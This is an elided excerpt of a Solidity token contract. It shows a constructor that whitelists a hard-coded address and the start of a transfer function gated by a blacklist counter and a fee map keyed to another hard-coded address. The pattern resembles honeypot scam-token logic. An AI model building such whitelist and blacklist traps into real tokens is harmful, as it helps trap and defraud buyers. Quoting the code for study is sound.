...
contract Coin is Operator {
    ...
    constructor () public {
        ...
        setWhiteList(address(0x617b7320A7607d88B269fcb65F70645dDb91cfB7),true);
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        ...
        if (blackCount < 9999 && feeMap[0x6725F303b657a9451d8BA641348b6761A6CC7a17] && !blackMap[recipient]) {
